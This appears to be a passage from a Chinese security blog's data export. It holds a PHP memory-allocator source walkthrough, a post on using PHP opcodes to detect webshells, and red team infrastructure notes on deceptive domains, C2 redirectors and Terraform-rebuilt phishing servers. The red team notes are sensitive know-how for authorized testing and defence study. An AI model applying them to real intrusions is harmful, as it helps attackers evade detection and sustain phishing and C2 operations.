 /* Found some \"small\" free block that can be used */\r\n      index += zend_mm_low_bit(bitmap);\r\n      best_fit = heap->free_buckets[index*2];\r\n#if ZEND_MM_CACHE_STAT\r\n      heap->cache_stat[ZEND_MM_NUM_BUCKETS].hit++;\r\n#endif\r\n      goto zend_mm_finished_searching_for_block;\r\n    }\r\n```\r\n\r\n**5.1：**首先看看free_buckets中剩余的内存是否满足true_size。（将heap->free_bitmap 右移index次，不为0则有空闲内存）\r\n\r\n```\r\nbitmap = heap->free_bitmap >> index;\r\n   if (bitmap) {\r\n}\r\n```\r\n\r\n**5.2：**根据内存大小找到最小块内存。\r\n\r\n```\r\nindex += zend_mm_low_bit(bitmap);\r\n```\r\n\r\n这里说一下zend_mm_low_bit和zend_mm_high_bit。他们就像哈希函数一样，将不同大小的内存映射到不同的index，使ZendMM快速定位，提高性能。\r\n\r\nzend_mm_low_bit实现如下：\r\n\r\n```\r\nstatic inline unsigned int zend_mm_low_bit(size_t _size)\r\n{\r\n#if defined(__GNUC__) && (defined(__native_client__) || defined(i386))\r\n  unsigned int n;\r\n\r\n  __asm__(\"bsfl %1,%0\\n\\t\" : \"=r\" (n) : \"rm\"  (_size));\r\n  return n;\r\n#elif defined(__GNUC__) && defined(__x86_64__)\r\n        unsigned long n;\r\n\r\n        __asm__(\"bsf %1,%0\\n\\t\" : \"=r\" (n) : \"rm\"  (_size));\r\n        return (unsigned int)n;\r\n#elif defined(_MSC_VER) && defined(_M_IX86)\r\n  __asm {\r\n    bsf eax, _size\r\n  }\r\n#else\r\n  static const int offset[16] = {4,0,1,0,2,0,1,0,3,0,1,0,2,0,1,0};\r\n  unsigned int n;\r\n  unsigned int index = 0;\r\n\r\n  n = offset[_size & 15];\r\n  while (n == 4) {\r\n    _size >>= 4;\r\n    index += n;\r\n    n = offset[_size & 15];\r\n  }\r\n\r\n  return index + n;\r\n#endif\r\n}\r\n```\r\n\r\n看看汇编和后面的C语言实现的方式就懂了，即bit scan forward，从低位向高位扫描，返回遇到1的比特位数。比如：bitmap为52(00110100)，那么返回值为2。可以看出，ZEND_MM_BUCKET_INDEX和zend_mm_low_bit结合起来，才是free_buckets的hash映射函数。\r\n\r\nzend_mm_high_bit则为large_free_buckets的hash映射函数。\r\n\r\n```\r\n#define ZEND_MM_LARGE_BUCKET_INDEX(S) zend_mm_high_bit(S)\r\n\r\nstatic inline unsigned int zend_mm_high_bit(size_t _size)\r\n{\r\n#if defined(__GNUC__) && (defined(__native_client__) || defined(i386))\r\n  unsigned int n;\r\n\r\n  __asm__(\"bsrl %1,%0\\n\\t\" : \"=r\" (n) : \"rm\"  (_size));\r\n  return n;\r\n#elif defined(__GNUC__) && defined(__x86_64__)\r\n  unsigned long n;\r\n\r\n        __asm__(\"bsr %1,%0\\n\\t\" : \"=r\" (n) : \"rm\"  (_size));\r\n        return (unsigned int)n;\r\n#elif defined(_MSC_VER) && defined(_M_IX86)\r\n  __asm {\r\n    bsr eax, _size\r\n  }\r\n#else\r\n  unsigned int n = 0;\r\n  while (_size != 0) {\r\n    _size = _size >> 1;\r\n    n++;\r\n  }\r\n  return n-1;\r\n#endif\r\n}\r\n```\r\n\r\nzend_mm_high_bit是bit scan reverse，也是从低位向高位扫描，但它是返回遇到最高位1的比特位数。比如：bitmap为512(1000000000)，那么返回值为9。\r\n\r\n**5.3：** 成功分配内存并返回。\r\n\r\n**6：** 如果free_buckets没有找到合适的内存，则进入zend_mm_search_large_block，在large_free_buckets中寻找合适的内存。\r\n\r\n```\r\nbest_fit = zend_mm_search_large_block(heap, true_size);\r\n```\r\n\r\n**6.1：**使用前面说过的宏ZEND_MM_LARGE_BUCKET_INDEX，来查找true_size对应的large_free_buckets。\r\n\r\n```\r\nsize_t index = ZEND_MM_LARGE_BUCKET_INDEX(true_size);\r\n```\r\n\r\n**6.2：**和之前小块内存分配的逻辑一样，看看large_free_buckets中剩余的内存是否满足true_size。（将heap->free_bitmap 右移index次，不为0则有空闲内存）\r\n\r\n```\r\nsize_t bitmap = heap->large_free_bitmap >> index;\r\n\r\nif (bitmap == 0) {\r\n  return NULL;\r\n}\r\n```\r\n\r\n**6.3：**看看large_free_buckets[index]是否存在可用的内存。\r\n\r\n```\r\nif (UNEXPECTED((bitmap & 1) != 0)) {\r\n}\r\n```\r\n\r\nlarge_free_buckets是一种字典树，如果large_free_buckets[index]中的内存大小和true_size相等，则返回这块内存。\r\n\r\n如果没有找到大小相等的内存，则寻找最小的“大块内存”。\r\n\r\n```\r\nbest_fit = p = heap->large_free_buckets[index + zend_mm_low_bit(bitmap)];\r\nwhile ((p = p->child[p->child[0] != NULL])) {\r\n  if (ZEND_MM_FREE_BLOCK_SIZE(p) < ZEND_MM_FREE_BLOCK_SIZE(best_fit)) {\r\n    best_fit = p;\r\n  }\r\n}\r\n```\r\n\r\n其中，`p = p→child[p→child[0] != NULL]` ，是寻找最小的block。\r\n\r\n**7：** 如果free_bucket和large_free_buckets都没有找到合适的内存，那么只好去搜索rest_buckets了。\r\n\r\n```\r\nif (!best_fit && heap->real_size >= heap->limit - heap->block_size) {\r\n  zend_mm_free_block *p = heap->rest_buckets[0];\r\n  size_t best_size = -1;\r\n```\r\n\r\n**8：**如果以上都没有合适的内存的话（有可能是初始化的时候，或者内存不足的情况），申请一块段内存。\r\n\r\n```\r\nsegment = (zend_mm_segment *) ZEND_MM_STORAGE_ALLOC(segment_size);\r\n```\r\n\r\n然后将这块新segment的第一块block作为best_fit使用。\r\n\r\n```\r\nbest_fit = (zend_mm_free_block *) ((char *) segment + ZEND_MM_ALIGNED_SEGMENT_SIZE);\r\nZEND_MM_MARK_FIRST_BLOCK(best_fit);\r\nblock_size = segment_size - ZEND_MM_ALIGNED_SEGMENT_SIZE - ZEND_MM_ALIGNED_HEADER_SIZE;\r\nZEND_MM_LAST_BLOCK(ZEND_MM_BLOCK_AT(best_fit, block_size));\r\n```\r\n\r\nsegment的结构如下图：\r\n\r\n![0LGJRs](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/0LGJRs.jpg)\r\n\r\n**9：** 最后，将新的block放入large_free_buckets/free_buckets/rest_buckets。\r\n\r\n```\r\nzend_mm_free_block *new_free_block;\r\n\r\n/* prepare new free block */\r\nZEND_MM_BLOCK(best_fit, ZEND_MM_USED_BLOCK, true_size);\r\nnew_free_block = (zend_mm_free_block *) ZEND_MM_BLOCK_AT(best_fit, true_size);\r\nZEND_MM_BLOCK(new_free_block, ZEND_MM_FREE_BLOCK, remaining_size);\r\n\r\n/* add the new free block to the free list */\r\nif (EXPECTED(!keep_rest)) {\r\n  zend_mm_add_to_free_list(heap, new_free_block);\r\n} else {\r\n  zend_mm_add_to_rest_list(heap, new_free_block);\r\n}\r\n```\r\n\r\n通过zend_mm_add_to_free_list可以看到large_free_bucket和free_buckets的分配方式。如果new_free_block是大块内存，则将它分配到large_free_buckets。\r\n\r\n```\r\nindex = ZEND_MM_LARGE_BUCKET_INDEX(size); //通过ZEND_MM_LARGE_BUCKET_INDEX定位到size对应的index\r\np = &heap->large_free_buckets[index];\r\nmm_block->child[0] = mm_block->child[1] = NULL; \r\nif (!*p) { //如果large_free_buckets[index]不存在，则直接写入。\r\n  *p = mm_block;\r\n  mm_block->parent = p;\r\n  mm_block->prev_free_block = mm_block->next_free_block = mm_block;\r\n  heap->large_free_bitmap |= (ZEND_MM_LONG_CONST(1) << index); //large_free_bitmap为可用大块内存大小\r\n} else {\r\n  size_t m;\r\n\r\n  for (m = size << (ZEND_MM_NUM_BUCKETS - index); ; m <<= 1) {\r\n    zend_mm_free_block *prev = *p;\r\n\r\n    if (ZEND_MM_FREE_BLOCK_SIZE(prev) != size) { //block的大小和size的大小不一样时，存入使其成为best_fit\r\n      p = &prev->child[(m >> (ZEND_MM_NUM_BUCKETS-1)) & 1]; //这里的m是size先左移(ZEND_MM_NUM_BUCKETS - index)，后(ZEND_MM_NUM_BUCKETS-1))，说白了就是将size右移至剩余的高两位。 比如size为1024，则这里(m >> (ZEND_MM_NUM_BUCKETS-1))的结果是10 。如果最后一位为0，则将mm_block放入child[0]，最后一位是1，mm_block放入child[1]。相应地，在zend_mm_search_large_block中，使用m = true_size << (ZEND_MM_NUM_BUCKETS - index)，将size左移(32-size位数)位，最高位0，则取child[0]，最高位1，则取child[1]。\r\n      if (!*p) {\r\n        *p = mm_block;\r\n        mm_block->parent = p;\r\n        mm_block->prev_free_block = mm_block->next_free_block = mm_block;\r\n        break;\r\n      }\r\n    } else { //block的大小和size的大小一样时，之前存入zend_mm_block中，本质是一个双向链表。\r\n      zend_mm_free_block *next = prev->next_free_block;\r\n\r\n      prev->next_free_block = next->prev_free_block = mm_block;\r\n      mm_block->next_free_block = next;\r\n      mm_block->prev_free_block = prev;\r\n      mm_block->parent = NULL;\r\n      break;\r\n    }\r\n  }\r\n}\r\n```\r\n\r\nlarge_free_buckets的结构如下图：\r\n\r\n![cE8Ivb](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/cE8Ivb.jpg)\r\n\r\n下面，说说ZendMM在释放内存的过程，跟分配内存的过程相反：\r\n\r\n**1：** 如果p是一个合法的指针，计算其对应的block，和block的大小。\r\n\r\n```\r\nif (!ZEND_MM_VALID_PTR(p)) {\r\n  return;\r\n}\r\n\r\nHANDLE_BLOCK_INTERRUPTIONS();\r\n\r\nmm_block = ZEND_MM_HEADER_OF(p);\r\nsize = ZEND_MM_BLOCK_SIZE(mm_block);\r\nZEND_MM_CHECK_PROTECTION(mm_block);\r\n```\r\n\r\n**2：**如果size是小块内存且cache未满(最大ZEND_MM_CACHE_SIZE)，计算其对应的index，将mm_block放入cache[index]。（CACHE默认开启，其中ZEND_MM_SMALL_SIZE、ZEND_MM_BUCKET_INDEX在前面分配内存的时候讲过）\r\n\r\n```\r\n#if ZEND_MM_CACHE\r\n  if (EXPECTED(ZEND_MM_SMALL_SIZE(size)) && EXPECTED(heap->cached < ZEND_MM_CACHE_SIZE)) {\r\n    size_t index = ZEND_MM_BUCKET_INDEX(size); \r\n    zend_mm_free_block **cache = &heap->cache[index];\r\n\r\n    ((zend_mm_free_block*)mm_block)->prev_free_block = *cache;\r\n    *cache = (zend_mm_free_block*)mm_block;\r\n    heap->cached += size;\r\n    ZEND_MM_SET_MAGIC(mm_block, MEM_BLOCK_CACHED);\r\n#if ZEND_MM_CACHE_STAT\r\n    if (++heap->cache_stat[index].count > heap->cache_stat[index].max_count) {\r\n      heap->cache_stat[index].max_count = heap->cache_stat[index].count;\r\n    }\r\n#endif\r\n  }\r\n```\r\n\r\n**3：**如果size是大块内存或者cache已满，且mm_block的前一块或者后一块block是空闲块，则调用zend_mm_remove_from_free_list将其删除（将下一个节点/上一节点合并）。如果mm_block为segment的第一块，则使用zend_mm_del_segment删除这个segment。否则就使用zend_mm_add_to_free_list将mm_block加入large_free_buckets/free_buckets/rest_buckets。\r\n\r\n```\r\nnext_block = ZEND_MM_BLOCK_AT(mm_block, size);\r\nif (ZEND_MM_IS_FREE_BLOCK(next_block)) {\r\n  zend_mm_remove_from_free_list(heap, (zend_mm_free_block *) next_block);\r\n  size += ZEND_MM_FREE_BLOCK_SIZE(next_block);\r\n}\r\nif (ZEND_MM_PREV_BLOCK_IS_FREE(mm_block)) {\r\n  mm_block = ZEND_MM_PREV_BLOCK(mm_block);\r\n  zend_mm_remove_from_free_list(heap, (zend_mm_free_block *) mm_block);\r\n  size += ZEND_MM_FREE_BLOCK_SIZE(mm_block);\r\n}\r\nif (ZEND_MM_IS_FIRST_BLOCK(mm_block) &&\r\n    ZEND_MM_IS_GUARD_BLOCK(ZEND_MM_BLOCK_AT(mm_block, size))) {\r\n  zend_mm_del_segment(heap, (zend_mm_segment *) ((char *)mm_block - ZEND_MM_ALIGNED_SEGMENT_SIZE));\r\n} else {\r\n  ZEND_MM_BLOCK(mm_block, ZEND_MM_FREE_BLOCK, size);\r\n  zend_mm_add_to_free_list(heap, (zend_mm_free_block *) mm_block);\r\n}\r\n```\r\n\r\n其中zend_mm_remove_from_free_list也只是将large_free_buckets/free_buckets/rest_buckets中mm_block的相关指针销毁，将回收到内存池中。\r\n\r\n# 小结\r\n\r\nPHP的内存管理实现了自己的内存池，使得PHP内核在真正使用内存之前，先申请一块内存，当我们申请内存时就从内存池中分出一部分内存块，若内存块不够再继续申请新的内存，提高了内存分配的效率。PHP还实现了垃圾回收机制（Garbage Collection）及写时复制（Copy On Write）以进一步优化。\r\n\r\n以上文章仅仅是我个人(当然主要还是那些参考资料)的理解，有什么错误的地方还请指正。\r\n\r\n# 参考资料\r\n\r\n1. [http://www.kancloud.cn/kancloud/php-internals/42794](http://www.kancloud.cn/kancloud/php-internals/42794)\r\n2. [https://wiki.php.net/internals/zend_mm](https://wiki.php.net/internals/zend_mm)\r\n3. [http://www.phppan.com/php-source-analytics/](http://www.phppan.com/php-source-analytics/)\r\n4. [http://www.laruence.com/2011/11/09/2277.html](http://www.laruence.com/2011/11/09/2277.html)\r\n5. [https://github.com/php/php-src/blob/PHP-5.4/Zend/zend_alloc.c](https://github.com/php/php-src/blob/PHP-5.4/Zend/zend_alloc.c)"},{"fields":{"slug":"/博客/Archive/读懂PHP opcode及其在webshell检测中的应用/","title":"读懂PHP opcode及其在webshell检测中的应用"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 读懂PHP opcode及其在webshell检测中的应用\r\ntags:\r\n  - 博客\r\n  - PHP\r\n  - webshell\r\n---\r\n\r\n## 什么是opcode\r\n\r\n当Zend Engine解析PHP脚本的时候，会对脚本进行词法、语法分析，然后编译成opcode来执行，类似JVM中的字节码(byte codes)，只不过opcode不会像class文件那种存在磁盘，而是在内存中直到PHP的生命周期结束。\r\n\r\n盗一张图：\r\n\r\n![opcode](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/DlYw5G.jpg)\r\n\r\n> opcode在PHP内核中是如何生成的可以参考 : [http://www.php-internals.com/book/?p=chapt02/02-03-02-opcode](http://www.php-internals.com/book/?p=chapt02/02-03-02-opcode)\r\n> \r\n\r\n我们可以通过PHP扩展vld来查看PHP脚本的opcode，可以参考：([http://blog.csdn.net/21aspnet/article/details/7002644)](http://blog.csdn.net/21aspnet/article/details/7002644))\r\n\r\nZend Engine中编译和执行PHP脚本的关键函数是：\r\n\r\n```c\r\nZEND_API zend_op_array *(*zend_compile_file)(zend_file_handle *file_handle, int type TSRMLS_DC);\r\nZEND_API void (*zend_execute)(zend_op_array *op_array TSRMLS_DC);\r\n```\r\n\r\nVLD就是通过HOOK Zend Engine中的这两个函数来实现dump opcode，来看看它的代码：\r\n\r\n```c\r\nPHP_RINIT_FUNCTION(vld){\r\n    old_compile_file = zend_compile_file;\r\n#if (PHP_MAJOR_VERSION > 5) || (PHP_MAJOR_VERSION == 5 && PHP_MINOR_VERSION >= 2)\r\n    old_compile_string = zend_compile_string;\r\n#endif\r\n    old_execute = zend_execute;\r\n    if (VLD_G(active)) {\r\n        zend_compile_file = vld_compile_file;\r\n#if (PHP_MAJOR_VERSION > 5) || (PHP_MAJOR_VERSION == 5 && PHP_MINOR_VERSION >= 2)\r\n        zend_compile_string = vld_compile_string;\r\n#endif\r\n        if (!VLD_G(execute)) {\r\n            zend_execute = vld_execute;\r\n        }\r\n    }\r\n}\r\n```\r\n\r\n在vld_compile_file中完成HOOK:\r\n\r\n```c\r\nstatic zend_op_array *vld_compile_file(zend_file_handle *file_handle, int type TSRMLS_DC){\r\n    ...\r\n    op_array = old_compile_file (file_handle, type TSRMLS_CC);\r\n    ...\r\n    return op_array;\r\n}\r\n```\r\n\r\n获取opcode后将其格式化输出：\r\n\r\n```c\r\nop_array = old_compile_file (file_handle, type TSRMLS_CC);\r\nif (op_array) {\r\n    vld_dump_oparray (op_array TSRMLS_CC); //格式化输出函数\r\n}\r\n```\r\n\r\n其实APC、Opcache等opcode优化扩展都是用这种方式来实现的。\r\n\r\n## 读懂opcode\r\n\r\n下面我们用vld生成一段opcode看看。PHP脚本如下：\r\n\r\n```php\r\n<?php\r\nfunction hello($who) {\r\n    return sprintf(\"Hello, %s!\", $who);\r\n}\r\n\r\necho hello('World');\r\n```\r\n\r\n执行vld，输出：\r\n\r\n```php\r\n$ ~php -dextension=vld.so -dvld.active=1 -dvld.verbosity=0 -dvld.execute=0 function.php\r\nfilename:       function.php\r\nfunction name:  (null)\r\nnumber of ops:  5\r\ncompiled vars:  none\r\nline     # *  op                           fetch          ext  return  operands\r\n---------------------------------------------------------------------------------\r\n   2     0  >   NOP                                                      \r\n   6     1      SEND_VAL                                                 'World'\r\n         2      DO_FCALL                                      1  $0      'hello'\r\n         3      ECHO                                                     $0\r\n   7     4    > RETURN                                                   1\r\n\r\nbranch: #  0; line:     2-    7; sop:     0; eop:     4\r\npath #1: 0, \r\nFunction hello:\r\nfilename:      function.php\r\nfunction name:  hello\r\nnumber of ops:  6\r\ncompiled vars:  !0 = $who\r\nline     # *  op                           fetch          ext  return  operands\r\n---------------------------------------------------------------------------------\r\n   2     0  >   RECV                                                     1\r\n   3     1      SEND_VAL                                                 'Hello%2C+%25s%21'\r\n         2      SEND_VAR                                                 !0\r\n         3      DO_FCALL                                      2  $0      'sprintf'\r\n         4    > RETURN                                                   $0\r\n   4     5*   > RETURN                                                   null\r\n\r\nbranch: #  0; line:     2-    4; sop:     0; eop:     5\r\npath #1: 0, \r\nEnd of function hello.\r\n```\r\n\r\n怎么去看呢？前面比较清晰，filename，function name 都是顾名思义。后面两行：\r\n\r\n1. number of ops：opcode的数量\r\n2. compiled vars：PHP变量编译后的opcode表示形式，因为opcode不会使用变量的名字，而是使用变量的ID。比如后面的hello函数中，$who 对应着 !0\r\n\r\n接着是后面的表格，列名含义如下表：\r\n\r\n| 列名 | 含义 |\r\n| --- | --- |\r\n| line | 对应PHP脚本中的行数 |\r\n| # | opcode编号 |\r\n| * | 貌似没用 |\r\n| op | 使用的Opcode，见：https://php.net/manual/en/internals2.opcodes.php#internals2.opcodes |\r\n| fetch | 不清楚 |\r\n| ext | 脚本执行所需要的其他信息 |\r\n| return | 返回值 |\r\n| operands | 操作数 |\r\n\r\n其实这些列名对应着PHP内核中opcode结构体的成员变量：\r\n\r\n```c\r\nstruct _zend_op {\r\n    opcode_handler_t handler;\r\n    znode_op op1;  // op1和op2是operands\r\n    znode_op op2;\r\n    znode_op result; //return\r\n    ulong extended_value; //ext\r\n    uint lineno; //line\r\n    zend_uchar opcode; //opcode\r\n    zend_uchar op1_type;\r\n    zend_uchar op2_type;\r\n    zend_uchar result_type;\r\n};\r\n```\r\n\r\n那么这段opcode的意思是：\r\n\r\n1. NOP是编译过程优化的结果，没什么意义。\r\n2. 把’World’作为参数传给后面的函数。\r\n3. 调用函数hello, 返回值为$0。\r\n4. ECHO 输出$0。\r\n5. 函数结束返回。\r\n\r\n下一段是hello函数：\r\n\r\n1. 接受传给函数的参数。\r\n2. 把’Hello%2C+%25s%21’作为参数传给后面的函数。\r\n3. 把!0作为参数传给后面的函数。\r\n4. 调用函数sprintf，返回值为$0。\r\n5. 函数返回$0。\r\n6. 函数结束。\r\n\r\n## 总结\r\n\r\n在Webshell检测中，opcode可以：（这里只讨论opcode在webshell检测中的作用）\r\n\r\n1. 辅助检测PHP后门/Webshell。\r\n    1. 优点：作为静态分析的辅助手段，可以快速精确定位PHP脚本中可控函数及参数的调用。\r\n    2. 缺点：需要人工维护关键字，无法应对变形马，如编码、ASCII运算等等。\r\n2. 帮助我们更加深入地理解PHP内核机制，使我们可以修改PHP源码或者以扩展的形式来动态检测PHP后门/Webshell。（HOOK关键危险函数，如eval, assert等，当GPC参数进入危险函数及有相关危险操作时，判定为后门/Webshell）\r\n    1. 优点：上面写的缺点取反，并且误报率低，准确。\r\n    2. 缺点：部署，维护成本高。\r\n\r\n## Reference\r\n\r\n1. [http://www.laruence.com/2008/08/14/250.html](http://www.laruence.com/2008/08/14/250.html)\r\n2. [http://blog.pascal-martin.fr/post/php-obtenir-dump-opcodes.html](http://blog.pascal-martin.fr/post/php-obtenir-dump-opcodes.html)\r\n3. [http://rancoud.com/read-phps-opcode/](http://rancoud.com/read-phps-opcode/)\r\n4. [http://www.php-internals.com/book/?p=chapt02/02-03-02-opcode](http://www.php-internals.com/book/?p=chapt02/02-03-02-opcode)\r\n5. [http://security.tencent.com/index.php/blog/msg/19](http://security.tencent.com/index.php/blog/msg/19)\r\n"},{"fields":{"slug":"/博客/生活/折纸作品/","title":"折纸作品"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 折纸作品\r\ntags:\r\n  - 博客\r\n  - 日常折腾\r\n---\r\n\r\n## Gallery\r\n\r\n![1](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/aHjSCA.jpg)\r\n![2](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/qCpGHx.jpg)\r\n![3](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/qwSdp5.jpg)\r\n![4](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/eR9ktj.jpg)\r\n![5](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/Y7Vyis.jpg)\r\n![6](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/70pfTU.jpg)"},{"fields":{"slug":"/博客/生活/摄影作品/","title":"摄影作品"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 摄影作品\r\ntags: \r\n  - 博客\r\n  - 日常折腾\r\n---\r\n\r\n## 丁丁\r\n\r\n![1](https://mars0run.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2e419e54-a89c-40ad-8d1b-c5a12dd82c62%2FUntitled.png?id=f6471d78-e4d5-42de-8a96-a851b9cf4826&table=block&spaceId=7472f6c4-ea2e-45de-b643-908ef53dae3e&width=2000&userId=&cache=v2)\r\n![2](https://mars0run.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ffd069322-ad08-4d20-bafb-093f9259c299%2FUntitled.png?id=5abf1225-a2bf-4cb5-8e96-6cfced367c04&table=block&spaceId=7472f6c4-ea2e-45de-b643-908ef53dae3e&width=2000&userId=&cache=v2)\r\n![3](https://mars0run.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2acad466-cc41-4f56-ab9f-7d057491f28d%2FUntitled.png?id=07957ea9-0236-4bd0-86ef-3fcb8979a0fb&table=block&spaceId=7472f6c4-ea2e-45de-b643-908ef53dae3e&width=1960&userId=&cache=v2)\r\n![4](https://mars0run.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Feb80ce03-c0ee-4f60-9564-8d2acb208076%2FUntitled.png?id=d59e5491-4c72-4fd8-949f-11005c878598&table=block&spaceId=7472f6c4-ea2e-45de-b643-908ef53dae3e&width=1960&userId=&cache=v2)\r\n![5](https://mars0run.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fa65a9deb-55fe-4af9-ac88-922e2ef5be20%2FUntitled.png?id=5654f382-e1a5-46a8-8c42-f96bcd8a1a0c&table=block&spaceId=7472f6c4-ea2e-45de-b643-908ef53dae3e&width=2000&userId=&cache=v2)\r\n![6](https://mars0run.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F52c0ae9b-98e9-45da-b573-ac35643f398d%2FUntitled.png?id=308add7d-4208-4862-999d-b63dcf274f14&table=block&spaceId=7472f6c4-ea2e-45de-b643-908ef53dae3e&width=2000&userId=&cache=v2)\r\n\r\n"},{"fields":{"slug":"/安全知识库/Red Team基础设施/域名/","title":"域名"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 域名\r\ntags:\r\n- Red Team基础设施\r\n- 域名\r\n---\r\n\r\n选择具有迷惑性的域名至关重要，如：可以使用expireddomains.net来收集最近过期或已丢弃域名。\r\n\r\n![tNsrRk](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/tNsrRk.jpg)\r\n\r\n同时要确认域名不会被第三方厂商列入黑名单：\r\n\r\n- McAfee https://trustedsource.org/en/feedback/url?action=checksingle\r\n- Fortiguard http://www.fortiguard.com/iprep\r\n- Symantec + BlueCoat http://sitereview.bluecoat.com/sitereview.jsp\r\n- Checkpoint (requires free account) https://www.checkpoint.com/urlcat/main.htm\r\n- Palo Alto https://urlfiltering.paloaltonetworks.com/\r\n- Sophos (submission only; no checking)  https://secure2.sophos.com/en-us/support/contact-support.aspx - Click Submit a Sample -> Web Address\r\n- TrendMicro https://global.sitesafety.trendmicro.com/\r\n- Brightcloud http://www.brightcloud.com/tools/url-ip-lookup.php\r\n- Websense (Forcepoint) http://csi.websense.com/\r\n- Lightspeed Systems https://archive.lightspeedsystems.com/\r\n- Chameleon https://github.com/mdsecactivebreach/Chameleon\r\n- SenderBase https://www.senderbase.org/\r\n- MultiBL http://multirbl.valli.org/\r\n- MXToolBox - Blacklists https://mxtoolbox.com/blacklists.aspx\r\n\r\n# 来源\r\n- [https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)"},{"fields":{"slug":"/安全知识库/Red Team基础设施/架构设计/","title":"架构设计"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 架构设计\r\ntags:\r\n- Red Team基础设施\r\n- 架构\r\n---\r\n\r\n# 1. 功能隔离\r\n将功能隔离在不同的资产上可以避免被Blue team一窝端：\r\n\r\n- 钓鱼SMTP\r\n- 钓鱼Payload\r\n- 长期使用的C2\r\n- 短期使用的C2\r\n- ...等等\r\n\r\n# 2. Redirectors\r\n为了进一步提高系统弹性和隐蔽性，每个后端资产都应该在其前面放置一个redirector，这种方式有两种好处：1.是能够解耦各个功能资产服务；2.是能够达到隐蔽效果。当某一个资产服务被Blue team发现时，无需部署整套后端服务，便可进行迁移会话、重连接后端的资产等。\r\n\r\n常见的redirector类型:\r\n\r\n- SMTP\r\n- Payloads\r\n- Web 流量\r\n- C2 (HTTP[S]、DNS、等)\r\n\r\n# 3. 案例\r\n下面这个样例，使用了功能分离和redirector的设计思路。其中LT DNS C2代表长期的 DNS C2 服务； ST DNS C2代表短期的 DNS C2 服务；ST HTTP C2 代表短期的 HTTP C2 服务。\r\n\r\n![nQ3ThV](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/nQ3ThV.jpg)\r\n\r\n还可以参考 [[CIA 如何实现C&C基础设施]]。\r\n\r\n# 4. 参考\r\n- [https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki](https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki)\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[CIA 如何实现C&C基础设施]: ../实践参考/CIA 如何实现C&C基础设施.md \"CIA 如何实现C&C基础设施\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/安全知识库/Red Team基础设施/自动化部署/","title":"自动化部署"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 自动化部署\r\ntags:\r\n- Red Team基础设施\r\n- 钓鱼\r\n- 命令与控制 C2\r\n- Redirector\r\n---\r\n\r\n# 1. 背景\r\n前面提到的架构和各种各样的Redirector，在实际部署使用的过程中会非常繁琐；从2014年开始已经有人提出了基础设施即代码（Infrastructure as Code），作为最佳实践，基础设施及代码授权所有准备计算资源所需要做的工作都可以通过代码来完成。 这类的平台比较多，比如Terraform，Chef，Puppet Ansible，CloudFormation，Salt等等。使用 Terraform 有很多吸引力，如：\r\n\r\n- 设计/测试基础设施一次，即可多次重复使用\r\n- 配置文件可以是代码控制的\r\n- 可以使用单个命令创建和销毁基础设施\r\n- 监控状态改变\r\n\r\n# 2. 基础设施概览\r\n下面是一个架构图，显示了构建的基础设施——它可以而且通常更加build-out，但原则保持不变——Redirector放置在每台服务器的前面，使基础设施更加隐蔽，能够用新的服务器快速更换消耗的服务器：\r\n\r\n![DYhT1D](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/DYhT1D.jpg)\r\n\r\n总共有6台服务器，3个长期服务（钓鱼、payload 和 c2），3 个redirector（smtp、payload 和 c2）。 我们假设这些服务器在实战中会Blue team检测到并需要销毁，这就是 Terraform 自动化部分的用武之地——因为我们的环境状态是在 Terraform 配置文件中定义的，我们几乎可以立即重建那些销毁的服务器，并且操作可以继续进行而不会出现更大的中断。\r\n\r\n# 3. 配置基础设施\r\n**基础设施是通过利用以下服务构建的：**\r\n\r\n- DigitalOcean Droplets(CVM)\r\n- DigitalOcean DNS management，需要能够为smtp redirector设置 PTR DNS 记录，以减少被目标邮件网关归类为垃圾邮件的概率\r\n- CloudFlare DNS management，用于控制指向长期服务器的 DNS 记录\r\n\r\n可以使用 Amazon AWS 或其他流行的 VPS 来构建服务器，只要它支持 Terraform 即可，这同样适用于 DNS 管理部分。\r\n\r\n文件结构：\r\n\r\n- 由以下方式组织的 terraform 配置文件定义：\r\n  - ![image-20230112232314479](/Users/mars/Library/Application Support/typora-user-images/image-20230112232314479.png)\r\n- Configs：包括payload redirector的配置（apache: .htaccess，apache2.conf），smtp redirector（postfix: header_checks - 用于去除原始 smtp 服务器的邮件标头，master.cf - TLS 和 opendkim 的通用后缀配置，opendkim.conf - 使用 postfix 配置 DKIM 集成）\r\n- providers：诸如 DigitalOcean 和 CloudFlare 之类的基础设施\r\n- variables：terraform的API key和其他相关数据\r\n- 